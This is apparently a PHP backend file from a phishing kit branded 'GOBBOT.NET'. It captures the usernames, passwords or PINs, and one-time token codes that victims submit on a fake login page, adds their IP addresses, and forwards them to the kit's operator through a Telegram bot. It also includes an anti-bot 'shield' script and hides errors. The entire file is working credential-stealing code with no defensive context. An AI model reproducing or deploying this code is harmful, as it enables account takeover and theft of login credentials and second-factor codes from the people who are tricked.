<?php
/**
###############################################
#    𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️ https://t.me/fatgov      #
###############################################
**/

error_reporting(0);
include '../../../config.php';
include 'tg.php';
include '../admin/blindaje/shield/fatgov.php';
$ip = $_SERVER['REMOTE_ADDR'];

$username = $_POST['exprmntusr'];
$password = $_POST['password'];

if (isset($_POST['password'])) {
    $msg  = "➖➖➖[ ".APP_NAME ." ]➖➖➖\r\n";
    $msg .= "✔️ USR : <code>{$_POST['exprmntusr']}</code>\r\n";
    $msg .= "✔️ PIN : <code>{$_POST['password']}</code>\r\n";
    $msg .= "➖➖➖ INFO ➖➖➖\r\n";
    $msg .= "🌐 IP : <code>".$ip."</code>\r\n";
    $msg .= "➖➖➖[ @". ADMIN ." ]➖➖➖\r\n\r\n\r\n";
    sendTg($msg, BOT_TOKEN, CHAT_ID);
    
}

if (isset($_POST['tokencode'])) {
    $msg  = "➖➖➖[ ".APP_NAME." ]➖➖➖\r\n\n";
    $msg .= "✔️ USR : <code>{$_POST['exprmntusr']}</code>\r\n\n";
    $msg .= "✔️ TOKEN : <code>{$_POST['tokencode']}</code>\r\n\n";
    $msg .= "🌐 IP : ".$ip."\r\n";
    $msg .= "➖➖➖[ @". ADMIN ." ]➖➖➖\r\n\r\n\r\n";
    sendTg($msg, BOT_TOKEN, CHAT_ID);
}

